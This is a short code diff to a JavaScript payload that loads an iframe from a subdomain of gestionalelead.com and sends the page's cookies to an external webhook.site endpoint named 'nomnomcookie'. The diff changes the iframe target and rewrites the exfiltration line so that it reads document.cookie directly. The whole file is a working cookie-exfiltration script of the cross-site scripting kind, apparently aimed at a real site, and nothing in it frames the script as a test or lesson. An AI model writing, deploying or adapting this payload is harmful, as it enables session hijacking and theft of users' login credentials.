@@ -1,9 +1,9 @@
 var iframe = document.createElement('iframe');
 //iframe.style.display = "none";
-iframe.src = 'https://bishopfox.gestionalelead.com/settings/third-parts';
+iframe.src = 'https://sse.gestionalelead.com/stream';
 document.body.appendChild(iframe);
 
 let xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://webhook.site/nomnomcookie?cookie=' + document.getElementById("login").contentDocument.cookie);
+xhr.open('GET', 'https://webhook.site/nomnomcookie?cookie=' + document.cookie);
 xhr.responseType = 'json';
 xhr.send();
